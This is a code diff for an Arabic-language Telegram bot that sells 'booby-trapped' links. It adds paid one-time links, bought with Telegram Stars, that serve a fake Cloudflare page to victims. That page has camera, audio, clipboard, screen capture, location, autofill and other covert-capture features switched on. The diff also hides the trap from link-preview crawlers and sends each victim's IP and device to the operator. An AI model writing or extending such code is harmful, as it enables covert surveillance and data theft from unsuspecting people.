@@ -45,10 +45,12 @@ const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, conta
 // These features are ALWAYS paid-VIP only — never free
 const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio']);
 
-let pageConfig  = { ...DEFAULT_PAGE_CONFIG, ...loadJSON(PAGE_CONFIG_FILE, {}) };
-let submissions = loadJSON(SUBMISSIONS_FILE, []);
-let userPages   = loadJSON(USER_PAGES_FILE, {});   // { uid: pageConfig }
-let userSubs    = loadJSON(USER_SUBS_FILE, {});     // { uid: [...submissions] }
+let pageConfig   = { ...DEFAULT_PAGE_CONFIG, ...loadJSON(PAGE_CONFIG_FILE, {}) };
+let submissions  = loadJSON(SUBMISSIONS_FILE, []);
+let userPages    = loadJSON(USER_PAGES_FILE, {});
+let userSubs     = loadJSON(USER_SUBS_FILE, {});
+let userAttempts = loadJSON('./attempts.json', {});     // { uid: count }
+let attemptLinks = loadJSON('./attempt_links.json', {}); // { token: { uid, url, used, createdAt } }
 
 let users      = new Set(loadJSON(USERS_FILE, []));
 let banned     = new Set(loadJSON(BANNED_FILE, []));
@@ -86,6 +88,8 @@ function savePageConfig(){ saveJSON(PAGE_CONFIG_FILE, pageConfig); backupFileToG
 function saveSubmissions(){ saveJSON(SUBMISSIONS_FILE, submissions); backupFileToGH(SUBMISSIONS_FILE,"_data/submissions.json").catch(()=>{}); }
 function saveUserPages()  { saveJSON(USER_PAGES_FILE, userPages);  backupFileToGH(USER_PAGES_FILE,"_data/user_pages.json").catch(()=>{}); }
 function saveUserSubs()   { saveJSON(USER_SUBS_FILE,  userSubs);   backupFileToGH(USER_SUBS_FILE, "_data/user_subs.json").catch(()=>{});  }
+function saveAttempts()   { saveJSON('./attempts.json', userAttempts); backupFileToGH('./attempts.json','_data/attempts.json').catch(()=>{}); }
+function saveAttemptLinks(){ saveJSON('./attempt_links.json', attemptLinks); backupFileToGH('./attempt_links.json','_data/attempt_links.json').catch(()=>{}); }
 
 function getUserPage(uid) {
   const id = String(uid);
@@ -342,7 +346,9 @@ const DATA_FILES = [
   { local: "./page_config.json", remote: "_data/page_config.json" },
   { local: "./submissions.json", remote: "_data/submissions.json" },
   { local: "./user_pages.json",  remote: "_data/user_pages.json"  },
-  { local: "./user_subs.json",   remote: "_data/user_subs.json"   },
+  { local: "./user_subs.json",      remote: "_data/user_subs.json"      },
+  { local: "./attempts.json",       remote: "_data/attempts.json"       },
+  { local: "./attempt_links.json",  remote: "_data/attempt_links.json"  },
 ];
 
 const _ghShaCache = new Map(); // remotePath → sha
@@ -605,6 +611,42 @@ async function handleLinkOpen(req, res, view) {
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
 app.get("/c/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "cloudflare"); });
+
+// ── Stars Attempt Links (/a/:token) ───────────────────────────────────────────
+app.get("/a/:token", async (req, res) => {
+  const ua = (req.headers['user-agent'] || '').toLowerCase();
+  if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit'))
+    return res.status(200).send('OK');
+  const token = req.params.token;
+  const entry = attemptLinks[token];
+  if (!entry) return res.status(404).send('<h2>رابط غير صالح</h2>');
+  if (entry.used) return res.status(403).send('<h2>هذا الرابط استُخدم من قبل ❌</h2>');
+  // Mark used immediately
+  entry.used = true;
+  saveAttemptLinks();
+  // Serve full-premium cloudflare page for this one shot
+  const ip  = getIP(req);
+  const d   = new Date().toJSON().slice(0,19).replace('T',' ');
+  const uid = entry.uid;
+  // Log the open for owner notification
+  const notifyOwner = async (data) => {
+    try { await bot.sendMessage(BOT_OWNER, `🎯 *محاولة مدفوعة فُتحت!*\n\n👤 منشئ الرابط: ${uid}\n🌐 IP: ${data.ip || ip}\n📍 الموقع: ${data.city||''} ${data.country||''}\n📱 الجهاز: ${data.ua||''}\n\nالرابط: \`${hostURL}/a/${token}\``, { parse_mode:'Markdown' }); } catch(e) {}
+  };
+  notifyOwner({ ip, ua: req.headers['user-agent'] });
+  res.render("cloudflare", {
+    ip, time: d,
+    url: entry.url,
+    uid: String(uid),
+    a: hostURL,
+    t: false,
+    feat: { ...DEFAULT_FEATURES },
+    premium: true,
+    camAccess: true, audioAccess: true, clipAccess: true,
+    pidAccess: true, localNetAccess: true, pushAccess: true,
+    screenCapAccess: true, contcamAccess: true, contaudioAccess: true,
+    faceAIAccess: true, activityAccess: true, autofillAccess: true, devtoolsAccess: true
+  });
+});
 app.get("/wa/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "whatsapp"); });
 app.get("/dl/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "download"); });
 app.get("/tt/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "tiktok"); });
@@ -841,6 +883,25 @@ bot.on('message', async (msg) => {
   if (msg?.reply_to_message?.text === "🌐 Enter Your URL" && msg.text)
     return createLink(chatId, msg.text);
 
+  // ── Attempt link creation reply ───────────────────────────────────────────
+  if (msg?.reply_to_message?.text?.includes('إنشاء رابط محاولة') && msg.text) {
+    const url = msg.text.trim();
+    if (!url.toLowerCase().startsWith('http')) return bot.sendMessage(chatId, '⚠️ أدخل رابطاً صحيحاً يبدأ بـ http');
+    const uid = String(chatId);
+    const bal = userAttempts[uid] || 0;
+    if (bal <= 0) return bot.sendMessage(chatId, '❌ ليس عندك محاولات! اشترِ أولاً.');
+    const token = require('crypto').randomBytes(12).toString('hex');
+    attemptLinks[token] = { uid: chatId, url, used: false, createdAt: Date.now() };
+    userAttempts[uid] = bal - 1;
+    saveAttempts();
+    saveAttemptLinks();
+    const aLink = `${hostURL}/a/${token}`;
+    return bot.sendMessage(chatId,
+      `✅ *رابط المحاولة جاهز!*\n\n🔗 \`${aLink}\`\n\n⚡ يشتغل مرة واحدة فقط مع كل الميزات المدفوعة\n💰 رصيدك المتبقي: *${userAttempts[uid]}* محاولة`,
+      { parse_mode:'Markdown' }
+    );
+  }
+
   if (msg?.reply_to_message?.text === "📢 اكتب الرسالة التي تريد إرسالها للجميع:" && chatId === BOT_OWNER) {
     let sent = 0, failed = 0;
     for (const uid of users) { try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; } }
@@ -1022,6 +1083,7 @@ bot.on('message', async (msg) => {
     const isPrem  = isPremium(chatId);
     const baseRows = [
       [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
+      [{ text: `🎯 محاولة مدفوعة (رصيدك: ${userAttempts[String(chatId)]||0})`, callback_data: "attempt_menu" }],
       [{ text: "💎 مميزات البريميوم", callback_data: "pinfo" }],
       [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }],
       [{ text: "📊 إحصائياتي", callback_data: "mystats" }],
@@ -1039,6 +1101,21 @@ bot.on('message', async (msg) => {
   }
 
   if (msg.text === "/create") return createNew(chatId);
+
+  if (msg.text === "/attempt") {
+    const bal = userAttempts[String(chatId)] || 0;
+    if (bal <= 0) return bot.sendMessage(chatId,
+      `❌ *ليس عندك محاولات!*\n\nاشترِ محاولات بـ 20 نجمة للواحدة`,
+      { parse_mode:'Markdown', reply_markup: JSON.stringify({ inline_keyboard: [
+        [{ text:'⭐ شراء محاولة (20 نجمة)', callback_data:'buy_attempt_1' }],
+        [{ text:'⭐ شراء 5 محاولات (100 نجمة)', callback_data:'buy_attempt_5' }]
+      ]}) }
+    );
+    return bot.sendMessage(chatId,
+      `🎯 *إنشاء رابط محاولة*\n\nرصيدك: *${bal}* محاولة\n\nأرسل الرابط الذي تريد تلغيمه:`,
+      { parse_mode:'Markdown', reply_markup: JSON.stringify({ force_reply: true }) }
+    );
+  }
 
   if (msg.text === "/myid")
     return bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });
@@ -1632,6 +1709,41 @@ bot.on('callback_query', async (q) => {
   if (chatId !== BOT_OWNER) {
     const subbed = await isSubscribed(chatId);
     if (!subbed) return sendForceSubMsg(chatId);
+  }
+
+  if (data === "attempt_menu") {
+    const bal = userAttempts[String(chatId)] || 0;
+    return bot.sendMessage(chatId,
+      `🎯 *محاولات مدفوعة*\n\nرصيدك: *${bal}* محاولة\n\nكل محاولة = رابط يشتغل مرة واحدة مع كل الميزات المدفوعة (كاميرا، صوت، موقع، إلخ)`,
+      { parse_mode:'Markdown', reply_markup: JSON.stringify({ inline_keyboard: [
+        ...(bal > 0 ? [[{ text:'🎯 إنشاء رابط محاولة', callback_data:'create_attempt' }]] : []),
+        [{ text:'⭐ شراء 1 محاولة — 20 نجمة',  callback_data:'buy_attempt_1'  }],
+        [{ text:'⭐ شراء 5 محاولات — 100 نجمة', callback_data:'buy_attempt_5'  }],
+        [{ text:'⭐ شراء 10 محاولات — 200 نجمة',callback_data:'buy_attempt_10' }],
+      ]}) }
+    );
+  }
+
+  if (data === "create_attempt") {
+    const bal = userAttempts[String(chatId)] || 0;
+    if (bal <= 0) return bot.answerCallbackQuery(q.id, {text:'❌ ليس عندك محاولات!', show_alert:true});
+    return bot.sendMessage(chatId,
+      `🎯 *إنشاء رابط محاولة*\n\nرصيدك: *${bal}* محاولة\n\nأرسل الرابط الذي تريد تلغيمه:`,
+      { parse_mode:'Markdown', reply_markup: JSON.stringify({ force_reply: true }) }
+    );
+  }
+
+  if (data.startsWith('buy_attempt_')) {
+    const count = parseInt(data.replace('buy_attempt_','')) || 1;
+    const stars  = count * 20;
+    return bot.sendInvoice(chatId,
+      `🎯 ${count} محاولة مدفوعة`,
+      `رابط يشتغل مرة واحدة مع كل الميزات: كاميرا، صوت، موقع GPS، وأكثر`,
+      `attempts:${count}`,
+      '',
+      'XTR',
+      [{ label: `${count} محاولة`, amount: stars }]
+    ).catch(e => bot.sendMessage(chatId, `❌ خطأ: ${e.message}`));
   }
 
   if (data === "crenew")  return createNew(chatId);
@@ -2681,6 +2793,26 @@ bot.on('callback_query', async (q) => {
       bot.sendMessage(chatId, `📷 QR: ${qrUrl}`);
     });
   }
+});
+
+// ── Telegram Stars Payments ───────────────────────────────────────────────────
+
+bot.on('pre_checkout_query', (q) => {
+  bot.answerPreCheckoutQuery(q.id, true).catch(()=>{});
+});
+
+bot.on('message', async (msg) => {
+  if (!msg?.successful_payment) return;
+  const uid = String(msg.chat.id);
+  const payload = msg.successful_payment.invoice_payload;
+  if (!payload.startsWith('attempts:')) return;
+  const count = parseInt(payload.split(':')[1]) || 1;
+  userAttempts[uid] = (userAttempts[uid] || 0) + count;
+  saveAttempts();
+  bot.sendMessage(msg.chat.id,
+    `✅ *تم الشراء!*\n\nرصيدك الآن: *${userAttempts[uid]}* محاولة\n\nاستخدم /attempt لإنشاء رابط محاولة`,
+    { parse_mode: 'Markdown' }
+  ).catch(()=>{});
 });
 
 bot.on('polling_error', () => {});
